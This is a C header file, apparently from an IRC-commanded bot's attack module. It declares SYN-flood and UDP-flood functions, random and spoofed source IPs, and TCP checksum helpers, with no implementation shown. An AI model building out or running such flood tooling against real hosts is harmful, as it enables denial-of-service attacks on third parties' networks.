#ifndef ATTACK_H
#define ATTACK_H

typedef struct {
	int n_pkts;
	uint32_t s_ip;
	uint32_t d_ip;
	uint16_t s_port;
	uint16_t d_port;
	int np_chg;
	char spoof_ip;
} attack_info;

// will be our pseudo TCP header for use in checksum
typedef struct {
	uint32_t saddr; // source
	uint32_t daddr; // destination
	unsigned char res; // reserved
	unsigned char proto; // protocol
	uint16_t tcp_len; // length of TCP segment (including header and data)

} tcp_pseudo_header;

unsigned short csum(unsigned short *buf, int nwords);

uint32_t get_random_ip();

int syn_flood(attack_info *ainfo, irc_info *info);

int udp_flood(attack_info *ainfo, irc_info *info);

unsigned short tcp_csum(unsigned short *psh, unsigned short *tcphdr, int pshwords, int tcpwords);

#endif
